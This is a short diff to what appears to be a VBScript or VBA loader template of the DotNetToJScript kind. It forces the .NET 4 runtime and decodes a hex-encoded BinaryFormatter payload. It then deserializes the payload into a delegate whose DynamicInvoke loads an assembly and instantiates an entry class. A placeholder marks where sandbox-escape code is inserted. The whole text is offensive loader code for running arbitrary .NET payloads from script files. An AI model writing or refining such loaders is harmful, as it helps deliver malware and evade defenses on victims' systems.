@@ -4,6 +4,7 @@ End Sub
 Sub SetVersion
 Dim shell
 Set shell = CreateObject("WScript.Shell")
+shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
 End Sub
 
 Private Function decodeHex(hex)
@@ -269,7 +270,6 @@ Function Run()
     Dim stm As Object, fmt As Object, al As Object
     Set stm = CreateObject("System.IO.MemoryStream")
     Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
-    Set al = CreateObject("System.Collections.ArrayList")
 
     Dim dec
     dec = decodeHex(serialized_obj)
@@ -280,12 +280,9 @@ Function Run()
 
     stm.Position = 0
 
-    Dim n As Object, d As Object, o As Object
-    Set n = fmt.SurrogateSelector
+    Dim d As Object, o As Object
     Set d = fmt.Deserialize_2(stm)
-    al.Add n
-
-    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+    Set o = d.DynamicInvoke(Nothing).CreateInstance(entry_class)
 
 %SANDBOX_ESCAPES%
 
